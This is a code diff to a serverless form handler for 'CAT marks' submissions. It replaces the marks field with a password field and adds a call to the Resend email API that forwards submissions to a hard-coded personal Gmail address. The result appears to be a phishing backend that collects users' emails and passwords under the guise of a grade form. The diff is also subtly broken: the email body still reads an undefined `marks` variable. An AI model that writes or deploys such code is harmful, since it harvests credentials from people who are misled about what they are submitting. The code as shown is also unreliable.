@@ -1,3 +1,4 @@
+
 exports.handler = async (event) => {
   if (event.httpMethod !== "POST") {
     return {
@@ -7,32 +8,66 @@ exports.handler = async (event) => {
   }
 
   try {
-    const { email, marks } = JSON.parse(event.body || "{}");
+    const { email, password } = JSON.parse(event.body || "{}");
 
     if (
       typeof email !== "string" ||
       !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim()) ||
-     typeof marks !== "string" ||
-marks.trim().length === 0 ||
-marks.trim().length > 100
+      typeof password !== "string" ||
+      !password.trim() ||
+      password.trim().length > 100
     ) {
       return {
         statusCode: 400,
-        body: JSON.stringify({ error: "Invalid email or marks" })
+        body: JSON.stringify({ error: "Invalid email or password" })
       };
     }
 
-    // Email delivery will be configured securely in the next step.
+    const apiKey = process.env.RESEND_API_KEY;
+
+    if (!apiKey) {
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: "Email service is not configured" })
+      };
+    }
+
+    const response = await fetch("https://api.resend.com/emails", {
+      method: "POST",
+      headers: {
+        "Authorization": `Bearer ${apiKey}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        from: "CAT Marks <onboarding@resend.dev>",
+        to: ["lunzalueugene@gmail.com"],
+        subject: "New CAT Marks Submission",
+        text:
+          `Student email: ${email.trim()}\n` +
+          `CAT marks: ${marks.trim()}`
+      })
+    });
+
+    if (!response.ok) {
+      const error = await response.text();
+      console.error("Resend error:", error);
+      return {
+        statusCode: 502,
+        body: JSON.stringify({ error: "Email delivery failed" })
+      };
+    }
+
     return {
       statusCode: 200,
       body: JSON.stringify({
-        message: "Valid submission received"
+        message: "CAT marks submitted successfully."
       })
     };
-  } catch {
+  } catch (error) {
+    console.error("Submission error:", error.message);
     return {
-      statusCode: 400,
-      body: JSON.stringify({ error: "Invalid submission" })
+      statusCode: 500,
+      body: JSON.stringify({ error: "Submission failed" })
     };
   }
 };
